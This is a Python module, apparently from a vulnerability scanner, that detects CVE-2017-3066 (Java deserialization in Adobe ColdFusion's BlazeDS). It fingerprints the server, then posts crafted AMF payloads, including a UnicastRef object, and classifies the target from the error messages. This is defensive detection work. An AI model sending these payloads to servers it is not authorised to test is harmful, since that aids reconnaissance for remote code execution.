"""Agent Asteroid implementation for CVE-2017-3066"""

import datetime
import logging
import struct

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit


VULNERABILITY_TITLE = "Java deserialization vulnerability in the Apache BlazeDS library in Adobe ColdFusion"
VULNERABILITY_REFERENCE = "CVE-2017-3066"
VULNERABILITY_DESCRIPTION = """
A critical Remote Code Execution (RCE) vulnerability exists in Adobe ColdFusion versions 2016 Update 3 and prior, 
11 Update 11 and prior, and 10 Update 22 and prior. 
This issue stems from insecure Java deserialization within the Apache BlazeDS library, 
enabling attackers to execute arbitrary code on the affected server.
"""

RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)
CF_AMF_ENDPOINT = "/flex2gateway/amf"
CF_PORT = 8500
CF_ADMIN = "/CFIDE/administrator/index.cfm"
CF_INDICATOR = "<title>ColdFusion Administrator Login</title>"
AMF_MESSAGE_TRIAGE = "Error deserializing client message"
AMF_MESSAGE_VULN = (
    "There was an unhandled failure on the server. java.lang.NullPointerException"
)
AMF_MESSAGE_SECURE = "Creation validation for class 'sun.rmi.server.UnicastRef' failed."
AMF_PAYLOAD = (
    b"\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a"
    + b"\x07\x33"
    + b"sun.rmi.server.UnicastRef"
    + struct.pack(">H", len("127.0.0.1"))
    + b"127.0.0.1"
    + struct.pack(">I", 1099)
    + b"\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00"
)

AMF_PAYLOAD_STRING = (
    b"\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a"
    + b"\x07\x33"
    + b"java.lang.String"
    + struct.pack(">H", len("malformed"))
    + b"malformed"
    + b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
)


@exploits_registry.register
class CVE20173066Exploit(webexploit.WebExploit):
    """
    CVE-2017-3066: Adobe ColdFusion Remote Code Execution (RCE)
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2017-3066"],
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Check if the target appears to be a ColdFusion server.
        Arg:
            target : target to scan for the vulnerability
        Returns:
            True if the target is a ColdFusion server (response contains CF_ADMIN or CF_INDICATOR), False Otherwise
        """
        try:
            response = self.session.get(
                f"{target.origin}{CF_ADMIN}",
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            return CF_INDICATOR in response.text
        except requests_exceptions.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Detect the unsafe deserialization vulnerability in ColdFusion BlazeDS.
        Follows a non-intrusive detection algorithm to identify the vulnerability.
        """
        vulnerabilities: list[definitions.Vulnerability] = []
        headers = {"Content-Type": "application/x-amf"}

        try:
            # Step 1: Malformed String Probe
            triage_response = self.session.post(
                f"{target.origin}{CF_AMF_ENDPOINT}",
                headers=headers,
                data=AMF_PAYLOAD_STRING,
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )

            # Step 2: Check for deserialization attempt
            if AMF_MESSAGE_TRIAGE.encode("utf-8") not in triage_response.content:
                logging.info("Target does not appear to be attempting deserialization")
                return vulnerabilities

            # Step 3: UnicastRef Probe
            response = self.session.post(
                f"{target.origin}{CF_AMF_ENDPOINT}",
                headers=headers,
                data=AMF_PAYLOAD,
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )

            # Step 4: NullPointerException Confirmation
            if AMF_MESSAGE_VULN.encode("utf-8") in response.content:
                logging.info(
                    "Vulnerability detected on %s: Deserialization caused NullPointerException",
                    target.origin,
                )
                vuln = self.create_vulnerability(target)
                vulnerabilities.append(vuln)
            # Step 5: Patch Detection
            elif AMF_MESSAGE_SECURE.encode("utf-8") in response.content:
                logging.info(
                    "Target appears to be patched against CVE-2017-3066: %s",
                    target.origin,
                )
            else:
                logging.info(
                    "No conclusive evidence of vulnerability found on %s",
                    target.origin,
                )

        except requests_exceptions.RequestException as e:
            logging.error("Error while detecting Coldfusion/BlazeDS RCE: %s", e)
            return []

        return vulnerabilities
